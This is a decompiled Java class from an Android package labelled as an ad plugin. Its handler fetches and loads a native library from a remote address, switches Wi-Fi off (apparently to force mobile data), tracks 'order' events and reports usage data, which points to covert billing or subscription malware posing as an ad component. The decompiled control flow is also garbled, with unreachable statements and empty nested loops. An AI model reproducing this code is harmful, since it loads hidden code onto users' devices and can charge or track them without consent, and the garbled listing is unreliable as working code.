package com.zyypt.adplugin;

import android.content.Context;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import com.mv.xing2.MvSdkJar;
import com.mv.xing2.Util;
import java.util.Random;
import org.json.JSONObject;

public class FKHandler
  extends Handler
{
  public static final int FKMSG_BINDTOKEN = 4099;
  public static final int FKMSG_DATACOLLECT = 4107;
  public static final int FKMSG_FINISH = 4096;
  public static final int FKMSG_GOHOME = 4102;
  public static final int FKMSG_LOGIN = 4101;
  public static final int FKMSG_NETTYPE = 4109;
  public static final int FKMSG_ORDER = 4104;
  public static final int FKMSG_PLAYERDATA = 4103;
  public static final int FKMSG_QUERYTOKEN = 4098;
  public static final int FKMSG_SMARTUSER = 4105;
  public static final int FKMSG_START = 4097;
  public static final int FKMSG_STATCOLLECT = 4106;
  public static final int FKMSG_TIMER = 4100;
  public static final int FKMSG_TIMER_BEGIN = 4356;
  public static final int FKMSG_TIMER_END = 4612;
  public static final int FKMSG_TOGGLEAPN = 4108;
  public Context mContext = null;
  public Bundle mInfo = null;
  public JSONObject mJson = null;
  private String mLibLocal;
  private String mLibName;
  private String mLibRemote;
  public Handler mParent = null;
  private boolean mbFirst = true;
  public boolean mbOrdered = false;
  
  public FKHandler() {}
  
  public static String getClientCode()
  {
    return "SOLD0001-0001-20150423";
  }
  
  public static String getClientVersion()
  {
    return "6.0.1";
  }
  
  public void dataCollect(Context paramContext, Bundle paramBundle, int paramInt)
  {
    a.a(paramContext, 1, paramInt + 6000, this.mJson, paramBundle);
  }
  
  public void handleMessage(Message paramMessage)
  {
    int i = 0;
    Object localObject;
    if ((4356 <= paramMessage.what) && (paramMessage.what <= 4612))
    {
      localObject = (Bundle)paramMessage.obj;
      MvSdkJar.nativeCallTimer(paramMessage.what, ((Bundle)localObject).getLong("callback"), ((Bundle)localObject).getLong("param"));
    }
    label548:
    do
    {
      do
      {
        do
        {
          boolean bool;
          do
          {
            do
            {
              String str;
              do
              {
                do
                {
                  do
                  {
                    do
                    {
                      do
                      {
                        do
                        {
                          do
                          {
                            return;
                            switch (paramMessage.what)
                            {
                            default: 
                              Util.Log("Java handle FKMSG_UNKOWN: " + paramMessage.what + "OBJ: " + paramMessage.obj);
                              return;
                            case 4097: 
                              if (this.mbFirst)
                              {
                                this.mbFirst = false;
                                dataCollect(this.mContext, this.mInfo, 9);
                                paramMessage = Util.javaGetDataFromSharedPref(this.mContext, "FKHandler_first_start");
                                if ((paramMessage == null) || (paramMessage.length() == 0))
                                {
                                  Util.javaSetDataToSharedPref(this.mContext, "FKHandler_first_start", "false");
                                  dataCollect(this.mContext, this.mInfo, 1);
                                }
                              }
                              Util.Log("Java a new start for FKHandler");
                              MvSdkJar.nativeStartSo(this.mContext, this.mInfo, this, this.mLibName, this.mLibRemote, this.mLibLocal);
                              return;
                            case 4096: 
                              Util.Log("Java end of worker FKHandler: arg1=" + paramMessage.arg1 + " arg2=" + paramMessage.arg2 + " obj=" + paramMessage.obj);
                              bool = this.mbOrdered;
                              if ((paramMessage.arg1 == 0) && (paramMessage.obj != null))
                              {
                                localObject = ((Bundle)paramMessage.obj).getString("playUrl");
                                Util.Log("Java end of worker playUrl:" + (String)localObject);
                                if ((localObject != null) && (((String)localObject).length() > 0))
                                {
                                  this.mbOrdered = true;
                                  if (!((String)localObject).substring(0, 7).toLowerCase().equals("rtsp://")) {
                                    break label548;
                                  }
                                  Util.downloadRtspInThread((String)localObject, Util.checkNetWork(this.mContext));
                                }
                              }
                              Util.Log("Java end of worker FKHandler: mbOrdered=" + this.mbOrdered);
                              if (paramMessage.arg1 == 0) {
                                if (!this.mbOrdered) {
                                  i = 150;
                                }
                              }
                              for (;;)
                              {
                                Util.Log("Java end of worker FKHandler: step=" + i);
                                dataCollect(this.mContext, this.mInfo, i);
                                if (((i == 12) || (i == 32)) && (a.a(this.mContext))) {
                                  dataCollect(this.mContext, this.mInfo, 2);
                                }
                                this.mParent.sendEmptyMessageDelayed(4096, 0L);
                                return;
                                Util.downloadm3u8(this.mContext, (String)localObject);
                                break;
                                if (bool)
                                {
                                  i = 31;
                                }
                                else
                                {
                                  i = 33;
                                  continue;
                                  if (paramMessage.arg2 == 4101) {
                                    i = 12;
                                  } else if (paramMessage.arg2 == 4104) {
                                    i = 32;
                                  } else if (paramMessage.arg2 == 4105) {
                                    i = 34;
                                  } else {
                                    i = 150;
                                  }
                                }
                              }
                            case 4098: 
                              Util.Log("Java handle FKMSG_QUERYTOKEN: " + paramMessage.obj);
                              return;
                            case 4099: 
                              Util.Log("Java handle FKMSG_BINDTOKEN: " + paramMessage.obj);
                              return;
                            case 4100: 
                              Util.Log("Java handle FKMSG_TIMER: id=" + paramMessage.arg1 + " bundle=" + paramMessage.obj);
                              localObject = (Bundle)paramMessage.obj;
                              MvSdkJar.nativeCallTimer(paramMessage.arg1, ((Bundle)localObject).getLong("callback"), ((Bundle)localObject).getLong("param"));
                              return;
                            case 4101: 
                              Util.Log("Java handle FKMSG_LOGIN: " + paramMessage.obj);
                              return;
                            case 4102: 
                              Util.Log("Java handle FKMSG_GOHOME: " + paramMessage.obj);
                              return;
                            case 4103: 
                              Util.Log("Java handle FKMSG_PLAYERDATA: " + paramMessage.obj);
                            }
                          } while (paramMessage.obj == null);
                          paramMessage = paramMessage.obj.toString();
                        } while (paramMessage.length() <= 0);
                        if (paramMessage.substring(0, 7).toLowerCase().equals("rtsp://"))
                        {
                          Util.downloadRtspInThread(paramMessage, Util.checkNetWork(this.mContext));
                          return;
                        }
                        Util.downloadm3u8(this.mContext, paramMessage);
                        return;
                        if ((paramMessage.arg1 == 0) && ((paramMessage.arg2 == 4104) || (paramMessage.arg2 == 4105))) {
                          this.mbOrdered = true;
                        }
                        Util.Log("Java handle FKMSG_ORDER: mbOrdered=" + this.mbOrdered + " msg.arg2=" + paramMessage.arg2);
                        return;
                        bool = this.mbOrdered;
                        if ((paramMessage.arg1 == 0) && (!this.mbOrdered) && (paramMessage.arg2 == 4105)) {
                          this.mbOrdered = true;
                        }
                        Util.Log("Java smart end of worker FKHandler: mbOrdered=" + this.mbOrdered + " bOrder=" + bool);
                        this.mParent.sendEmptyMessageDelayed(4096, 0L);
                        return;
                        Util.Log("Java handle FKMSG_STATCOLLECT: arg1=" + paramMessage.arg1);
                      } while (paramMessage.obj == null);
                      localObject = (Bundle)paramMessage.obj;
                      str = ((Bundle)localObject).getString("client_version");
                    } while ((str == null) || (str.length() <= 0));
                    if (paramMessage.arg1 == 4096)
                    {
                      a.a(this.mContext, (Bundle)localObject);
                      return;
                    }
                    if (paramMessage.arg1 == 4106)
                    {
                      a.b((Bundle)localObject);
                      return;
                    }
                  } while (paramMessage.arg1 != 4107);
                  a.a((Bundle)localObject);
                  return;
                  Util.Log("Java handle FKMSG_DATACOLLECT: arg1=" + paramMessage.arg1);
                } while (paramMessage.obj == null);
                localObject = (Bundle)paramMessage.obj;
                str = ((Bundle)localObject).getString("client_version");
              } while ((str == null) || (str.length() <= 0));
              a.a(this.mContext, 1, paramMessage.arg1, this.mJson, (Bundle)localObject);
              return;
              localObject = this.mInfo;
              if (paramMessage.obj != null) {
                localObject = (Bundle)paramMessage.obj;
              }
              if (paramMessage.arg1 != 1) {
                break;
              }
            } while (Util.checkNetWork(this.mContext) != 0);
            if (localObject != null)
            {
              i = ((Bundle)localObject).getInt("dataoffset", 0);
              a.a(this.mContext, 1, i + 50, this.mJson, (Bundle)localObject);
            }
            bool = Util.closeWifi(this.mContext);
          } while (!bool);
          if (!bool) {
            break;
          }
          Util.javaSetDataToSharedPref(this.mContext, "needtowifi", "true");
          sendMessageDelayed(obtainMessage(4109), 8000L);
        } while (localObject == null);
        a.a(this.mContext, 1, i + 51, this.mJson, (Bundle)localObject);
        return;
        Util.openWifi(this.mContext);
        return;
        paramMessage = Util.javaGetDataFromSharedPref(this.mContext, "needtowifi");
      } while ((paramMessage == null) || (!paramMessage.equals("true")));
      Util.javaSetDataToSharedPref(this.mContext, "needtowifi", "false");
      Util.openWifi(this.mContext);
      return;
    } while (this.mInfo == null);
    i = Util.checkNetWork(this.mContext);
    Util.Log("Java handle FKMSG_NETTYPE: net_type=" + i);
    this.mInfo.putInt("net_type", i);
  }
  
  public boolean nextData3(Context paramContext, Handler paramHandler, Bundle paramBundle, JSONObject paramJSONObject)
  {
    this.mbOrdered = false;
    if ((paramContext == null) || (paramBundle == null) || (paramHandler == null)) {
      return false;
    }
    this.mContext = paramContext;
    this.mParent = paramHandler;
    this.mInfo = ((Bundle)paramBundle.clone());
    this.mJson = paramJSONObject;
    int i = Util.checkNetWork(this.mContext);
    this.mInfo.putInt("net_type", i);
    this.mInfo.putString("client_code", getClientCode());
    this.mInfo.putString("client_version", getClientVersion());
    this.mLibName = null;
    this.mLibRemote = null;
    this.mLibLocal = null;
    paramContext = this.mInfo.getString("contentid").split(",");
    i = new Random().nextInt(paramContext.length);
    this.mInfo.putString("contentid", paramContext[i]);
    sendEmptyMessageDelayed(4097, 0L);
    return true;
  }
  
  public boolean nextData4(Context paramContext, Handler paramHandler, Bundle paramBundle, JSONObject paramJSONObject)
  {
    this.mbOrdered = false;
    String str2 = paramBundle.getString("mode");
    String str3 = paramBundle.getString("libarm");
    String str1 = paramBundle.getString("liblocal");
    String str4 = paramBundle.getString("productid");
    paramBundle.getString("channelid");
    if ((paramContext == null) || (paramBundle == null) || (paramHandler == null) || (str1 == null) || (str1.length() == 0)) {
      return false;
    }
    String str5 = getClientCode();
    this.mContext = paramContext;
    this.mParent = paramHandler;
    this.mInfo = ((Bundle)paramBundle.clone());
    this.mJson = paramJSONObject;
    int i = Util.checkNetWork(this.mContext);
    this.mInfo.putInt("net_type", i);
    this.mInfo.putString("client_code", str5);
    this.mInfo.putString("client_version", getClientVersion());
    if ((str4 == null) || (str4.length() == 0)) {
      this.mInfo.putString("productid", str1);
    }
    this.mLibName = str1;
    if (str2.equals("static")) {
      this.mLibRemote = null;
    }
    for (this.mLibLocal = null;; this.mLibLocal = ("/data/data/" + paramContext + "/cache/lib" + str1 + ".so"))
    {
      sendEmptyMessageDelayed(4097, 0L);
      return true;
      this.mLibRemote = str3;
      paramContext = this.mContext.getPackageName();
    }
  }
}
